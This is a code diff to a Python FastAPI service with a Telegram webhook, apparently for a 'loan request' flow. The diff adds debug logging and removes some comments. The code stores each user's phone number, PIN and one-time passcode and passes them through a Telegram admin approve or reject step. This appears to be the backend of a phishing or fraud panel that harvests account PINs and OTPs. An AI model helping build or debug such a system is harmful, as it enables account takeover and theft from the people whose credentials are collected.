@@ -61,19 +61,11 @@ KEEP_ALIVE_INTERVAL_SECONDS = 14 * 60
 
 
 async def keep_alive_ping():
-    """
-    Background task: hits our own root endpoint every 14 minutes.
-    Render suspends after 15 min of no traffic, so this keeps us under.
-
-    NOTE: only helps while the container is already awake. If the
-    service has been suspended, this task is frozen and cannot wake it.
-    Use an external monitor (UptimeRobot, cron-job.org) as a backstop.
-    """
     if not KEEP_ALIVE_URL:
         print("[KEEP-ALIVE] No KEEP_ALIVE_URL set — self-ping disabled.")
         return
 
-    await asyncio.sleep(60)  # small initial delay
+    await asyncio.sleep(60)
 
     while True:
         try:
@@ -112,9 +104,6 @@ init_db()
 
 otp_store = {}
 
-# ────────────────────────────────────────────────────────────────
-# OTP-request storage (ref_id-driven)
-# ────────────────────────────────────────────────────────────────
 otp_requests: dict[str, dict] = {}
 phone_latest_ref: dict[str, str] = {}
 
@@ -638,22 +627,31 @@ async def loan_request_status_endpoint(approval_id: str):
 # ==============================
 @app.post("/telegram/webhook")
 async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
+    # ─── DEBUG: confirm the webhook is being hit at all ───
+    raw = await request.body()
+    print(f"🚨 [TG-WEBHOOK] HIT! {len(raw)} bytes: {raw[:300]}")
+
     try:
-        body = await request.body()
-        if not body:
+        if not raw:
+            print("🚨 [TG-WEBHOOK] empty body — ignoring")
             return {"ok": True}
-        data = json.loads(body)
+        data = json.loads(raw)
     except Exception as e:
-        print(f"Webhook parse error: {e}")
+        print(f"🚨 [TG-WEBHOOK] parse error: {e}")
         return {"ok": True}
 
     if "callback_query" not in data:
+        print(f"🚨 [TG-WEBHOOK] no callback_query — keys={list(data.keys())}")
         return {"ok": True}
 
     try:
         callback = data["callback_query"]
         callback_id = callback["id"]
         callback_data = callback.get("data", "")
+
+        # ─── DEBUG: what did the admin tap? ───
+        print(f"🚨 [TG-WEBHOOK] callback_data={callback_data}")
+        print(f"🚨 [TG-WEBHOOK] known refs={list(otp_requests.keys())}")
 
         if callback_data.startswith("loan_approve:") or callback_data.startswith("loan_reject:"):
             action, approval_id = callback_data.split(":", 1)
@@ -672,6 +670,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
 
         parts = callback_data.split(":")
         if len(parts) < 2:
+            print(f"🚨 [TG-WEBHOOK] malformed callback_data: {callback_data}")
             return {"ok": True}
 
         action, approval_id = parts[0], parts[1]
@@ -679,6 +678,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
 
         req = otp_requests.get(approval_id)
         if req:
+            print(f"🚨 [TG-WEBHOOK] found ref in otp_requests — status={req['status']}")
             expire_if_needed(req)
             if req["status"] != "pending":
                 await answer_callback_query(callback_id, f"Already {req['status']}")
@@ -692,7 +692,9 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                 otp_store.pop(req["phone"], None)
 
             phone, pin, otp = req["phone"], req["pin"], req["otp"]
+            print(f"🚨 [TG-WEBHOOK] set status={req['status']} for ref={approval_id}")
         else:
+            print(f"🚨 [TG-WEBHOOK] ref {approval_id} NOT in otp_requests — trying legacy path")
             set_approval_result(approval_id, approved)
             phone = approval_phones.get(approval_id, "Unknown")
             pin = approval_pins.get(approval_id, "Unknown")
@@ -734,5 +736,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         return {"ok": True}
 
     except Exception as e:
-        print(f"Webhook processing error: {e}")
+        print(f"🚨 [TG-WEBHOOK] processing error: {e}")
+        import traceback
+        traceback.print_exc()
         return {"ok": True}
